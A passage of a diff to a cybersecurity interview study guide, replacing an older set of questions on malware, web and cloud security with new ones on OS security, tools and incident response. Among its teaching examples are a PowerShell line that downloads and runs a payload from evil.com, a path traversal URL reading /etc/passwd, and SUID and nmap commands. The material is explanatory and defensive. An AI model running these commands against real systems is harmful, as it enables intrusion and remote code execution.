+> *Example (horizontal, web app):* A logged-in user changes the `user_id` parameter in a URL from `1234` to `1235` and views another customer's order history.
+
+---
+
+**47. What is a Man-in-the-Browser (MitB) attack?**
+
+A variant of MITM where malware infects the browser itself. The attacker can modify web pages as they're displayed to the user, intercept form submissions, and manipulate transactions — even when the connection is over HTTPS.
+
+> *Example:* Banking Trojan modifies the transfer page so that the user sees `Transfer to Mum: £100` but the malware changes the destination account in the actual transaction.
+
+> *Why HTTPS doesn't protect here:* The malware operates after decryption, inside the browser, before the user sees it.
+
+---
+
+**48. What is an insider threat?**
+
+A security threat originating from within the organisation — employees, contractors, former staff, or trusted third parties.
+
+**Types:**
+- **Malicious insider** — Intentionally steals data, sabotages systems, or commits fraud
+- **Negligent insider** — Accidentally causes harm through carelessness (sending sensitive data to wrong address, clicking phishing links)
+- **Compromised insider** — Legitimate account taken over by an external attacker
+
+> *Detection:* User Behaviour Analytics (UBA/UEBA) — flagging unusual access patterns, abnormal data downloads, off-hours logins, access to resources outside normal role.
+
+---
+
+**49. What is OSINT and how is it used in attacks?**
+
+OSINT (Open-Source Intelligence) is gathering information about a target from publicly available sources — before making any direct contact with their systems.
+
+> *Sources an attacker uses:*
+> - **LinkedIn** — org chart, technologies used, employee names and roles
+> - **Job postings** — reveals tech stack ("must know Kubernetes, AWS, PostgreSQL")
+> - **GitHub** — leaked API keys, credentials in code, internal tooling
+> - **WHOIS/DNS** — domain registration details, subdomains
+> - **Shodan** — internet-facing devices and services
+> - **Google Dorking** — advanced search operators to find exposed files and login pages
+
+> *Defence:* Minimise public exposure — remove sensitive info from job postings, train developers not to commit secrets to public repos, monitor for data leakage.
+
+---
+
+**50. What is the difference between a vulnerability scan and a penetration test?**
+
+| | Vulnerability Scan | Penetration Test |
+|--|-------------------|-----------------|
+| **Method** | Automated tooling | Manual + tools |
+| **Exploits?** | No — finds, doesn't exploit | Yes — exploits to prove impact |
+| **Output** | List of potential vulnerabilities | Demonstrated real-world attack paths |
+| **Frequency** | Continuous / regular | Periodic (quarterly, annually) |
+| **Who does it?** | Security team / automated | Specialist testers |
+
+> *Analogy:* A vulnerability scan checks whether your doors and windows are locked. A penetration test actually tries to break in and tells you exactly how they got through.
+
+---
+
+## SECTION 4: OPERATING SYSTEM SECURITY
+*Interviewers test whether you can work with the OS where attacks actually happen.*
+
+---
+
+**51. What is the Windows Registry and why does it matter in security?**
+
+The Windows Registry is a hierarchical database storing configuration settings for the OS, applications, and hardware. It controls how Windows starts and how programs behave.
+
+> *Security relevance:* Malware commonly uses registry keys for persistence — adding entries to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` ensures the malware starts automatically when the user logs in.
+
+> *Key hives:*
+> - `HKLM` (HKEY_LOCAL_MACHINE) — system-wide settings
+> - `HKCU` (HKEY_CURRENT_USER) — settings for the current user
+
+---
+
+**52. What are the most important Windows Event IDs a SOC analyst must know?**
+
+| Event ID | Meaning | Why it matters |
+|----------|---------|---------------|
+| **4624** | Successful login | Baseline — check logon type |
+| **4625** | Failed login | Pattern of many = brute force |
+| **4648** | Login with explicit credentials | Lateral movement indicator |
+| **4672** | Admin privileges assigned at login | High-value account activity |
+| **4688** | New process created | Detects malicious processes, LOLBin abuse |
+| **4698** | Scheduled task created | Persistence mechanism |
+| **4720** | User account created | Could be attacker creating backdoor account |
+| **4728/4732** | User added to security group | Privilege escalation |
+| **1102** | Security log cleared | **Critical — attacker covering tracks** |
+| **7045** | New service installed | Persistence mechanism |
+
+> *Interview scenario:* "You see 5,000 Event ID 4625s followed by one 4624. What does this mean?" Answer: A brute force attack succeeded. Immediately investigate the account and the source IP.
+
+---
+
+**53. What are Logon Types in Windows Event ID 4624?**
+
+The Logon Type field tells you *how* the user authenticated:
+
+| Type | Name | What it means |
+|------|------|--------------|
+| 2 | Interactive | Physical keyboard login at console |
+| 3 | Network | Access to shared resource from network |
+| 4 | Batch | Scheduled task ran |
+| 5 | Service | Service account started a service |
+| 7 | Unlock | Screen was unlocked |
+| 10 | RemoteInteractive | RDP connection |
+| 11 | CachedInteractive | Logged in using cached credentials |
+
+> *Why Type 3 matters:* Unusual Type 3 logins from a workstation account to a server at 3am = likely lateral movement.
+
+---
+
+**54. What is the Linux file permission system and how does chmod work?**
+
+Linux permissions are expressed as `rwx` for three groups: **owner**, **group**, and **others**.
+
+- `r` = read (value: 4)
+- `w` = write (value: 2)
+- `x` = execute (value: 1)
+
+`ls -la` shows permissions like: `-rwxr-xr--`
+- First character: file type (`-` = file, `d` = directory)
+- Next three: owner permissions (rwx = 7)
+- Next three: group permissions (r-x = 5)
+- Last three: others (r-- = 4)
+
+`chmod 755 file` — owner gets full access (7=rwx), group and others get read+execute (5=r-x)
+
+---
+
+**55. What is SUID in Linux and why is it a security risk?**
+
+SUID (Set User ID) is a special permission bit. When set on an executable, the program runs with the file owner's privileges — typically root — regardless of who executes it.
+
+> *Legitimate use:* `/usr/bin/passwd` needs root to write `/etc/shadow`. SUID allows any user to run it while the program itself runs as root.
+
+> *Security risk:* If `bash`, `python`, `vim`, or `find` have SUID root set, any user can exploit them to get a root shell. This is a common privilege escalation path.
+
+> *Find SUID files:* `find / -perm -4000 -type f 2>/dev/null`
+
+---
+
+**56. What is sudo and how is it different from running as root?**
+
+`sudo` (superuser do) allows a specific command to be run with elevated privileges without the user being logged in as root. Access is controlled by `/etc/sudoers`.
+
+**Why this is better than logging in as root:**
+- Actions are logged (`/var/log/auth.log`)
+- Each admin uses their own account (accountability)
+- Privileges can be granularly controlled per user per command
+- Mistakes as root are catastrophic — sudo limits the scope
+
+---
+
+**57. What are the most important Linux log files for a security analyst?**
+
+| File | What it contains |
+|------|----------------|
+| `/var/log/auth.log` | SSH logins, sudo usage, authentication attempts |
+| `/var/log/syslog` | General system events |
+| `/var/log/kern.log` | Kernel-level messages |
+| `/var/log/apache2/access.log` | Every HTTP request to the web server |
+| `/var/log/apache2/error.log` | Web server errors |
+| `/var/log/audit/audit.log` | Detailed security events (if auditd is running) |
+
+> *Quick command:* `grep "Failed password" /var/log/auth.log` — shows all failed SSH attempts.
+
+---
+
+**58. What is the /etc/passwd and /etc/shadow file?**
+
+- `/etc/passwd` — Contains user account information: username, UID, GID, home directory, shell. World-readable. The password field just shows `x` — meaning look in shadow.
+- `/etc/shadow` — Contains the actual password hashes. Only readable by root. Also contains password expiry information.
+
+> *Why they're separate:* If hashes were in `/etc/passwd`, any local user could read it and attempt offline cracking. Separation enforces access control on the sensitive data.
+
+---
+
+**59. What is Active Directory at a basic level?**
+
+Active Directory (AD) is Microsoft's directory service — it is the centralised system that manages users, computers, groups, and policies in a Windows enterprise environment.
+
+Key components:
+- **Domain** — A logical grouping (e.g., `company.com`)
+- **Domain Controller (DC)** — The server running AD that handles authentication
+- **Organisational Unit (OU)** — A container inside a domain (e.g., "IT Department")
+- **Group Policy (GPO)** — Rules pushed to computers and users centrally (e.g., enforce screen lock, block USB)
+
+> *Why it's a security target:* AD is the keys to the kingdom. Control over AD means control over every user and computer in the organisation.
+
+---
+
+**60. What is NTLM and Kerberos at a basic level?**
+
+These are the two Windows authentication protocols:
+
+**NTLM** — Challenge-response protocol. Server sends a random challenge; client encrypts it with their password hash and sends it back. Older, weaker, but still used as a fallback. Vulnerable to relay attacks.
+
+**Kerberos** — Ticket-based system. A trusted third party (Key Distribution Center) issues encrypted tickets that prove identity. More secure than NTLM. Default in modern AD environments.
+
+> *Basic entry-level understanding:* Know that Kerberos is preferred and more secure, NTLM is legacy and has known weaknesses. You don't need to know the full Kerberos ticket flow for an entry-level role, but you should know *why* Kerberos is better.
+
+---
+
+## SECTION 5: SECURITY TOOLS & TECHNOLOGIES
+
+---
+
+**61. What is Wireshark and what would you use it for?**
+
+Wireshark is a network packet analyser — it captures and lets you inspect every packet on a network interface. It's the most widely used tool for network troubleshooting and forensic analysis.
+
+> *Security uses:* Investigating suspicious traffic, analysing malware behaviour, detecting unencrypted credentials, identifying port scans, verifying firewall rules.
+
+> *Basic filters:*
+> - `dns` — show all DNS traffic
+> - `http` — show HTTP requests
+> - `tcp.port == 445` — show SMB traffic
+> - `ip.addr == 192.168.1.50` — traffic to/from one host
+
+---
+
+**62. What is nmap and what does it do?**
+
+Nmap (Network Mapper) is a port scanner and network discovery tool. It identifies which hosts are alive on a network, what ports are open, what services are running, and sometimes what OS the target is using.
+
+> *Key commands:*
+> - `nmap 192.168.1.0/24` — discover live hosts on a subnet
+> - `nmap -sV target` — detect service versions
+> - `nmap -p- target` — scan all 65535 ports
+> - `nmap -sS target` — SYN scan (stealthier — doesn't complete handshake)
+
+> *Important:* Only run nmap against systems you own or have explicit written permission to test.
+
+---
+
+**63. What is a SIEM and what does it do?**
+
+A SIEM (Security Information and Event Management) platform centralises logs from across the environment, correlates events to detect threats, and alerts security analysts.
 
 **Core functions:**
-- **Log aggregation** — Collect from firewalls, DCs, endpoints, cloud, applications
-- **Normalisation** — Convert different log formats to a common structure
-- **Correlation** — Apply rules: "5 failed logins + 1 success from same IP in 5 minutes = alert"
-- **Alerting** — Generate tickets/notifications for analyst triage
-- **Forensic search** — Search historical logs during investigations
+- Collects logs from firewalls, servers, endpoints, cloud, applications
+- Normalises different log formats into a common structure
+- Correlates events: "5 failed logins + 1 success from the same IP = brute force alert"
+- Provides historical search for investigation
+- Generates dashboards and compliance reports
 
-> **Common SIEMs:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM, LogRhythm.
-
----
-
-**Q77. [CRITICAL] What is the CIA Triad?**
-
-The three core pillars of information security:
-
-- **Confidentiality** — Only authorised parties access data (encryption, access control)
-- **Integrity** — Data is not altered without authorisation (hashing, digital signatures)
-- **Availability** — Systems and data are accessible when needed (redundancy, backups, DDoS protection)
-
-> **Attack against each:** Ransomware attacks all three — encrypts data (confidentiality), alters/locks files (integrity), makes systems unusable (availability).
+> *Common SIEMs:* Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM.
 
 ---
 
-**Q78. What is Defence in Depth?**
+**64. What is an EDR and how is it different from traditional antivirus?**
 
-A layered security strategy where multiple independent controls protect the same asset. If one fails, others remain.
+**Traditional Antivirus:** Signature-based. Compares files against a database of known malicious signatures. Completely blind to new threats (zero-days) and fileless attacks (nothing to scan).
 
-```
-[Physical security]
-  [Perimeter firewall]
-    [Network segmentation]
-      [Endpoint protection]
-        [Application security]
-          [Data encryption]
-            [IAM / least privilege]
-              [Monitoring & response]
-```
+**EDR (Endpoint Detection and Response):** Monitors endpoint behaviour in real-time. Detects suspicious activity (not just known signatures): a Word document spawning PowerShell, unusual outbound connections, suspicious registry modifications. Also provides response capabilities: isolate endpoint, kill process, capture forensic snapshot.
 
-> **Analogy:** A castle — moat, outer wall, inner wall, keep, guards. Breaching one layer doesn't grant full access.
+> *Think of AV as:* A wanted poster. Only catches known criminals.
+> *Think of EDR as:* A security camera analysing behaviour. Can spot suspicious activity even from someone not on any list.
 
 ---
 
-**Q79. What is Zero Trust?**
+**65. What is a WAF (Web Application Firewall)?**
 
-A security model based on "never trust, always verify." No user or device is trusted by default — regardless of network location.
+A WAF sits in front of web applications and inspects HTTP/HTTPS traffic at Layer 7. It specifically protects against web application attacks: SQL injection, XSS, CSRF, path traversal, and other OWASP Top 10 threats.
 
-**Principles:**
-1. Verify every access request (MFA, device health, context)
-2. Use least privilege
-3. Assume breach — monitor everything, segment everything
-
-> **Old model:** "Inside the network = trusted." Zero Trust: "Inside or outside = equally untrusted until verified."
+> *Difference from NGFW:* An NGFW protects the whole network perimeter at multiple layers. A WAF only protects web applications, but much more deeply at Layer 7.
 
 ---
 
-**Q80. What is DLP (Data Loss Prevention)?**
+**66. What is Burp Suite used for?**
 
-A system that monitors and prevents unauthorised movement of sensitive data outside the organisation.
+Burp Suite is a web application security testing toolkit used by penetration testers and bug bounty hunters. Its core feature is a proxy that intercepts traffic between your browser and a web application, allowing you to inspect and modify every request and response.
 
-- **Endpoint DLP** — Monitors USB, clipboard, print, email from devices
-- **Network DLP** — Inspects outbound traffic for PII, card numbers, IP
-- **Cloud DLP** — Monitors uploads to cloud storage
-
-> **Example:** Employee tries to email a spreadsheet with 500 credit card numbers. Network DLP detects the pattern, blocks the email, and alerts the security team.
+> *Common uses:* Testing for SQL injection, XSS, authentication flaws, insecure direct object references, parameter manipulation.
 
 ---
 
-**Q81. What is DKIM, SPF, and DMARC?**
+**67. What is the purpose of Nessus?**
 
-Email authentication standards working together to prevent spoofing:
+Nessus is an automated vulnerability scanner. It probes targets for known vulnerabilities, misconfigurations, default credentials, and missing patches — generating a prioritised report.
 
-| Protocol | What it does |
-|----------|-------------|
-| **SPF** | DNS record listing authorised sending servers |
-| **DKIM** | Cryptographic signature on emails, verified by receiver |
-| **DMARC** | Policy: what to do if SPF/DKIM fail (none/quarantine/reject) + reporting |
-
-> **Without all three:** Attacker can send email appearing to be from `ceo@company.com`.
-> **With all three:** The spoofed email fails SPF check, DMARC policy rejects it, and you receive a DMARC report about the attempt.
+> *Key distinction:* Nessus finds vulnerabilities — it doesn't exploit them. That's the difference between a vulnerability scanner and a penetration testing tool.
 
 ---
 
-**Q82. What is the difference between false positive and false negative?**
+**68. What is Metasploit?**
 
-- **False Positive** — Alert fires on benign activity. Wastes analyst time. Causes alert fatigue. Risk: analysts start ignoring alerts.
-- **False Negative** — Real attack goes undetected. **More dangerous.** Attacker operates undetected.
+Metasploit is a penetration testing framework that provides a library of exploits, payloads, and post-exploitation tools. It's used by penetration testers (and unfortunately attackers) to exploit known vulnerabilities.
 
-> **Tuning goal:** Minimise both — but in practice, most teams tune to reduce false positives at acceptable false negative risk. The balance depends on what you're protecting.
-
----
-
-**Q83. What is threat modelling and what is STRIDE?**
-
-Threat modelling systematically identifies security threats during design. STRIDE categorises threats:
-
-| Letter | Threat | Target Property |
-|--------|--------|----------------|
-| **S** | Spoofing | Authentication |
-| **T** | Tampering | Integrity |
-| **R** | Repudiation | Non-repudiation |
-| **I** | Information Disclosure | Confidentiality |
-| **D** | Denial of Service | Availability |
-| **E** | Elevation of Privilege | Authorisation |
-
-> **Example:** Designing a new API — run STRIDE on each component. "Could an attacker spoof the client identity?" → Add mutual TLS. Document threats found and mitigations applied.
+> *Entry-level understanding needed:* Know what it is, that it's used for authorised testing, and that it contains exploits and payloads. You don't need to know its syntax in depth for entry-level roles unless specifically testing for it.
 
 ---
 
-**Q84. What is vulnerability management?**
+**69. What is Threat Intelligence and how is it used?**
 
-The ongoing cycle of identifying, classifying, prioritising, and remediating security vulnerabilities.
+Threat Intelligence is information about current and emerging threats — who is attacking, what methods they use, what infrastructure they operate, and what their targets are. It helps defenders anticipate and prepare for attacks.
 
-**Process:** Scan → Assess severity (CVSS score) → Prioritise by risk (severity × exploitability × asset value) → Remediate (patch, mitigate, accept) → Verify → Repeat.
+**Types:**
+- **Strategic** — High-level trends for executive decisions
+- **Operational** — Specific campaigns and attacker TTPs
+- **Tactical** — IoCs (Indicators of Compromise): malicious IPs, file hashes, domains
 
-> **CVSS (Common Vulnerability Scoring System):** 0-10 scale. Critical ≥ 9.0. Widely used to standardise severity communication.
-
----
-
-**Q85. What is the difference between a vulnerability assessment and a penetration test?**
-
-| | Vulnerability Assessment | Penetration Test |
-|--|------------------------|-----------------|
-| Method | Automated scanning | Manual + tool-assisted |
-| Exploits? | No | Yes |
-| Depth | Breadth-focused | Goal-focused |
-| Output | List of vulnerabilities | Demonstrated impact |
-| Frequency | Continuous/regular | Periodic |
+> *Practical use:* Receive a threat intel feed listing known malicious IPs → push them to your firewall blocklist automatically. Or: learn an APT group is targeting your industry with spear phishing → run a simulated campaign, update email filters, brief employees.
 
 ---
 
-## 9. WEB APPLICATION SECURITY
+**70. What is Shodan?**
+
+Shodan is a search engine that indexes internet-connected devices and their open ports/services. Unlike Google (which indexes web content), Shodan indexes the banners that devices return when probed.
+
+> *Legitimate use:* Security teams use it to find their own exposed assets — internet-facing services they didn't know about.
+
+> *Attacker use:* Finding exposed webcams, industrial control systems, databases with no authentication, default-credential devices.
+
+> *Why it matters:* If your systems show up on Shodan with unexpected services open, attackers already know. You should find out first.
 
 ---
 
-**Q86. [CRITICAL] What is the OWASP Top 10?**
-
-Most critical web application security risks (2021 edition):
-
-1. **Broken Access Control** — Users doing things they shouldn't be allowed to do
-2. **Cryptographic Failures** — Sensitive data exposed due to weak/missing encryption
-3. **Injection** — SQLi, command injection, LDAP injection
-4. **Insecure Design** — Security not considered during design phase
-5. **Security Misconfiguration** — Default passwords, verbose errors, open S3 buckets
-6. **Vulnerable and Outdated Components** — Using libraries with known CVEs
-7. **Identification and Authentication Failures** — Weak passwords, no MFA, session issues
-8. **Software and Data Integrity Failures** — Supply chain attacks, insecure deserialization
-9. **Security Logging and Monitoring Failures** — Not detecting breaches in time
-10. **Server-Side Request Forgery (SSRF)**
+## SECTION 6: INCIDENT RESPONSE & SOC FUNDAMENTALS
 
 ---
 
-**Q87. What is path traversal?**
+**71. What are the phases of Incident Response?**
 
-Manipulating file path parameters with `../` to access files outside the intended directory.
+Following the NIST framework, there are 6 phases:
 
-> **Example:** `https://site.com/download?file=../../../../etc/passwd`
-> If the app doesn't sanitise, it reads the system password file.
-> **Prevention:** Validate and sanitise file paths. Use allowlists of permitted files. Never concatenate user input into file paths.
+| Phase | What you do |
+|-------|------------|
+| **Preparation** | Build playbooks, train the team, deploy monitoring tools, establish communication plans |
+| **Identification** | Detect the incident — SIEM alert, user report, threat hunting discovery |
+| **Containment** | Stop the spread — isolate affected systems (short-term) and prevent re-entry (long-term) |
+| **Eradication** | Remove the threat — delete malware, close the attack vector, patch the vulnerability |
+| **Recovery** | Restore systems and verify they're clean before returning to production |
+| **Lessons Learned** | Post-incident review — what failed, what worked, what to improve |
 
----
-
-**Q88. What is clickjacking and how is it prevented?**
-
-Overlaying an invisible iframe over a legitimate-looking page to trick users into clicking something they can't see.
-
-> **Example:** Invisible Facebook "Like" button overlaid on a "Claim your prize" button.
-> **Prevention:** `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` HTTP response headers.
+> *Key insight:* Containment comes BEFORE eradication. You stop the bleeding before you treat the wound.
 
 ---
 
-**Q89. What are HTTP security headers and why do they matter?**
+**72. What is the difference between an event, an alert, and an incident?**
 
-| Header | Purpose |
-|--------|---------|
-| `Strict-Transport-Security` (HSTS) | Force HTTPS, prevent downgrade attacks |
-| `Content-Security-Policy` (CSP) | Restrict sources of scripts/styles — prevents XSS |
-| `X-Frame-Options` | Prevent clickjacking |
-| `X-Content-Type-Options: nosniff` | Prevent MIME type sniffing |
-| `Referrer-Policy` | Control referrer information leakage |
-| `Permissions-Policy` | Restrict browser features (camera, mic, geolocation) |
+- **Event** — Any observable occurrence in a system. Most events are normal. (A user logging in is an event.)
+- **Alert** — An event that has been flagged as potentially significant by a security tool. Not all alerts are incidents.
+- **Incident** — A confirmed violation of security policies or a threat to systems — requires a response.
+
+> *Example:* 100 failed logins = event. SIEM fires an alert on that pattern = alert. Investigation confirms it's a real attack in progress = incident.
 
 ---
 
-**Q90. What is the difference between authentication and session management vulnerabilities?**
+**73. What is triage and why is it important in a SOC?**
 
-- **Authentication flaws:** Weak passwords, no account lockout, no MFA, default credentials, predictable tokens.
-- **Session management flaws:** Session tokens in URL, long session lifetime, no invalidation on logout, predictable session IDs.
+Triage is the rapid assessment of alerts to determine their severity and priority — so the most critical threats are handled first and limited analyst time isn't wasted on false positives.
 
-> **Example attack:** User logs out, but session token remains valid. Attacker who captured the token can still authenticate as that user (session fixation/not invalidating).
-
----
-
-## 10. MALWARE & MODERN THREATS
-
----
-
-**Q91. [CRITICAL] What is the difference between a virus, worm, and Trojan?**
-
-| Type | Self-replicates? | Needs host? | Needs user action? |
-|------|----------------|-------------|-------------------|
-| **Virus** | Yes | Yes (attaches to files) | Yes (run the file) |
-| **Worm** | Yes | No | No (self-propagates via network) |
-| **Trojan** | No | No | Yes (user installs thinking it's legitimate) |
-
-> **Example:** WannaCry = worm (self-propagated via EternalBlue). A cracked game with a hidden RAT = Trojan.
+**Typical severity levels:**
+- **Critical** — Active attack, data exfiltration, ransomware spreading
+- **High** — Confirmed compromise, contained
+- **Medium** — Suspicious activity, possible compromise
+- **Low** — Policy violation, vulnerability found but not exploited
 
 ---
 
-**Q92. What is fileless malware and why is it hard to detect?**
+**74. What is the order of volatility and why does it matter in forensics?**
 
-Malware that runs entirely in memory without writing files to disk. It abuses legitimate system tools (PowerShell, WMI, certutil) to execute payloads. Traditional file-based antivirus cannot detect it since there's no file to scan.
+When collecting evidence from a compromised system, you collect the most volatile evidence first because it is lost when the system is powered off.
 
-> **Example:** PowerShell downloads shellcode directly into memory: `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
->
-> **Detection:** Memory analysis, behavioural EDR (detects suspicious API calls), script block logging (PowerShell Event ID 4104), AMSI (Antimalware Scan Interface).
+**Order (most to least volatile):**
+1. RAM / Memory — running processes, active connections, encryption keys
+2. Network state — ARP table, active connections
+3. Running processes
+4. Disk content — files, logs, registry
+5. Remote logs / SIEM data
+6. Backups
 
----
-
-**Q93. What is ransomware and how does a ransomware attack typically unfold?**
-
-Ransomware encrypts victim's files and demands payment for the decryption key.
-
-**Typical attack chain:**
-1. Initial access — phishing email / exposed RDP / VPN vulnerability
-2. Persistence established — registry run keys, scheduled tasks
-3. Lateral movement — spread to as many systems as possible
-4. Privilege escalation — obtain Domain Admin
-5. Data exfiltration — steal data first (double extortion)
-6. Mass encryption — deploy ransomware across domain
-7. Ransom note dropped
-
-> **Defence:** Offline/offsite backups (3-2-1 rule), EDR, network segmentation, least privilege, MFA on remote access.
+> *Critical point:* Never immediately power off a compromised system. You lose everything in RAM — including potentially the encryption keys to decrypt ransomware, or evidence of what the attacker was doing.
 
 ---
 
-**Q94. What is a rootkit and how is it detected?**
+**75. What is an IoC (Indicator of Compromise)?**
 
-Malware that hides itself (and other malicious components) from the OS, security tools, and analysts by operating at or below the OS level.
+Evidence that a system or network has been compromised. Used to detect known threats and share threat intelligence.
 
-**Types:** Userland, Kernel-level (most dangerous — modifies kernel), Bootkit (loads before OS), Hypervisor-level.
+> *Examples of IoCs:*
+> - Malicious file hash (MD5/SHA-256)
+> - Known bad IP address or domain
+> - Unusual registry key created by malware
+> - Specific file path created by a malware family
+> - Unusual outbound connections at regular intervals (C2 beaconing)
 
-**Detection:** Memory forensics, integrity checking (compare known-good hashes), offline scanning (boot from clean media), behaviour-based detection.
-
----
-
-**Q95. What is a RAT (Remote Access Trojan)?**
-
-Malware providing full remote control to the attacker: command execution, file access, keylogging, screen capture, webcam/mic access.
-
-> **Common RATs:** njRAT, AsyncRAT, QuasarRAT, DarkComet. Typically communicate over common ports (80, 443) to evade detection.
+> *IoCs are reactive* — they require someone to have seen the attack before. Behavioural detection (BIoC) catches attacks even without prior knowledge of the specific malware.
 
 ---
 
-**Q96. What is a botnet and what is it used for?**
+**76. What would you do if you discovered a workstation is communicating with a known malicious IP?**
 
-A network of infected machines (bots) controlled via C2 infrastructure. Used for: DDoS attacks, spam/phishing campaigns, credential stuffing, cryptocurrency mining, proxy networks.
-
-> **Example:** Mirai botnet — infected IoT devices (cameras, routers using default passwords) — launched 1.2 Tbps DDoS attack on Dyn DNS in 2016, taking down Twitter, Netflix, Reddit.
-
----
-
-**Q97. What are persistence mechanisms and why do attackers use them?**
-
-Persistence ensures the attacker maintains access even after system restarts or credential changes.
-
-**Common Windows persistence mechanisms:**
-- Registry Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
-- Scheduled tasks (Event ID 4698)
-- Services (Event ID 4697 / 7045)
-- Startup folder
-- WMI event subscriptions (stealthy — rarely checked)
-- DLL hijacking
-
-> **Detection:** Event IDs 4697, 4698, 7045. Autoruns (Sysinternals) shows all persistence points on a system.
+A structured, methodical answer:
+1. **Don't panic** — document what you've observed with timestamps
+2. **Isolate the machine** from the network immediately to prevent further communication or lateral movement
+3. **Preserve evidence** — memory dump, network connection logs, running processes
+4. **Investigate** — what process is making the connection? When did it start? How did the malicious software arrive?
+5. **Check for lateral movement** — has this machine connected to other internal systems?
+6. **Begin IR process** — escalate to senior analyst / IR team
+7. **Eradicate** — once fully understood, rebuild or remediate the system
+8. **Block** the malicious IP at the perimeter for all other systems
 
 ---
 
-**Q98. What is PowerShell-based malware and how do you detect it?**
+**77. What is MITRE ATT&CK and why should a junior analyst know it?**
 
-PowerShell is a powerful scripting language built into Windows — attackers abuse it for fileless attacks, downloading payloads, lateral movement, and bypassing controls.
+MITRE ATT&CK is a publicly available framework cataloguing real-world attacker Tactics, Techniques, and Procedures (TTPs). Organised by the attacker's goals at each phase of an attack.
 
-**Detection:**
-- **Event ID 4104** (Script Block Logging) — logs the full PowerShell script content, including deobfuscated code
-- **Event ID 4103** (Module Logging) — logs pipeline execution
-- Suspicious indicators: base64-encoded commands (`-EncodedCommand`), `IEX` (Invoke-Expression), `DownloadString`, `Bypass` execution policy
-
-> **Enable via GPO:** Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on Script Block Logging.
+> *Practical value for a junior analyst:*
+> - When you see suspicious PowerShell activity, look it up in ATT&CK (T1059.001) — understand what attackers do with it
+> - Use it to understand *why* an alert fired, not just that it fired
+> - Helps you search for related activity in logs — if you see one technique, ATT&CK shows you what attackers typically do next
 
 ---
 
-## 11. CLOUD SECURITY
+**78. What is a playbook in the context of incident response?**
+
+A playbook is a documented, step-by-step guide for how to respond to a specific type of incident. It removes uncertainty under pressure and ensures consistent, complete responses.
+
+> *Example:* A phishing playbook would include steps for: collecting the email headers, analysing the link/attachment safely, identifying affected users, resetting credentials, blocking the domain at the email gateway, and communicating with users.
 
 ---
 
-**Q99. [CRITICAL] What is the Shared Responsibility Model?**
+**79. What is threat hunting?**
 
-Security in cloud is shared between the provider and customer:
+Proactively searching through systems, networks, and logs to find threats that have evaded automated detection — rather than waiting for an alert.
 
-| | AWS/Azure/GCP manages | Customer manages |
-|---|---|---|
-| IaaS | Physical, network, hypervisor | OS, apps, data, IAM |
-| PaaS | Above + OS, runtime | Apps, data |
-| SaaS | Everything | Data, user access |
+**Differs from alert response:** Alert response is reactive (an alert fires, you investigate). Threat hunting is proactive (analyst forms a hypothesis and goes looking).
 
-> **Most breaches happen in the customer's responsibility zone** — misconfigured S3 buckets, overly permissive IAM, unpatched OS on EC2.
+> *Example:* An analyst reads that a known threat actor uses PowerShell encoded commands for lateral movement. Even with no alert fired, they search their SIEM for PowerShell processes with base64-encoded command-line arguments. They find something. That's threat hunting.
 
 ---
 
-**Q100. What is the difference between IaaS, PaaS, and SaaS?**
+**80. What is chain of custody and why does it matter?**
 
-- **IaaS (Infrastructure as a Service):** Virtual machines, storage, networking. You manage OS upward. (AWS EC2, Azure VMs)
-- **PaaS (Platform as a Service):** Platform and OS managed for you. You write and deploy the application. (Heroku, Google App Engine)
-- **SaaS (Software as a Service):** Fully managed application. You just use it. (Gmail, Office 365, Salesforce)
+A documented, unbroken record of who collected evidence, who handled it, when, and what was done with it. Required for evidence to be legally admissible in court or disciplinary proceedings.
 
----
-
-**Q101. What are common cloud misconfigurations and their impact?**
-
-| Misconfiguration | Impact |
-|----------------|--------|
-| Public S3 bucket | Data exposure — billions of records leaked historically |
-| Overly permissive IAM roles | Privilege escalation, account takeover |
-| Unrestricted security groups (0.0.0.0/0) | Exposed databases, RDP, SSH to internet |
-| No MFA on root/admin accounts | Full account compromise |
-| Exposed metadata endpoint | IAM credential theft (SSRF → metadata → credentials) |
-| Disabled CloudTrail | No forensic trail after breach |
-
-> **Real case:** Capital One 2019 — SSRF vulnerability + overly permissive EC2 IAM role → access to 100M customer records in S3.
+> *If the chain breaks:* A defence attorney can argue the evidence was tampered with or contaminated, potentially having it excluded from proceedings. This can mean an attacker walks free or a civil case is lost.
 
 ---
 
-**Q102. What is AWS IAM and what are key security principles?**
-
-IAM (Identity and Access Management) controls who (identity) can do what (permission) to which AWS resources.
-
-**Security principles:**
-- Least privilege — grant minimum required permissions
-- Never use root account for day-to-day operations
-- Use roles (not access keys where possible) for EC2 instances
-- Rotate access keys regularly
-- Enable MFA on all human accounts
+## SECTION 7: GOVERNANCE, RISK & COMPLIANCE
 
 ---
 
-**Q103. What is the difference between AWS Security Groups and NACLs?**
+**81. What is risk management in cybersecurity?**
 
-| | Security Groups | NACLs |
-|--|----------------|-------|
-| Level | Instance (EC2) | Subnet |
-| State | Stateful (return traffic automatic) | Stateless (explicit allow both directions) |
-| Rules | Allow only | Allow and Deny |
-| Evaluation | All rules evaluated | Rules evaluated in order (by number) |
+The systematic process of identifying, assessing, prioritising, and responding to security risks to the organisation.
 
-> **Example:** Security Group allows inbound 443. Return traffic is automatically allowed (stateful). NACL would need explicit outbound allow rule for the return traffic.
+**Process:** Identify assets → Identify threats and vulnerabilities → Assess risk (likelihood × impact) → Choose response (avoid, mitigate, transfer, accept) → Monitor and review.
 
 ---
 
-**Q104. What are key AWS security monitoring services?**
+**82. What is GDPR and what does it require?**
 
-| Service | Purpose |
-|---------|---------|
-| **CloudTrail** | Logs all API calls — who did what, when |
-| **GuardDuty** | Threat detection — ML-based anomaly detection |
-| **Security Hub** | Centralised security findings aggregation |
-| **Config** | Tracks configuration changes, compliance |
-| **Inspector** | Vulnerability scanning for EC2 and containers |
-| **Macie** | Discovers and protects sensitive data in S3 |
+GDPR (General Data Protection Regulation) is an EU law governing how organisations collect, process, and store personal data of EU citizens.
 
-> **If CloudTrail is disabled in an AWS account — that's a critical alert.** Attackers disable it to eliminate forensic evidence.
-
----
-
-**Q105. What is container security and what are the key risks?**
-
-Containers (Docker/Kubernetes) introduce specific security concerns:
-
-| Risk | Description |
-|------|-------------|
-| Privileged containers | Container with `--privileged` can escape to host |
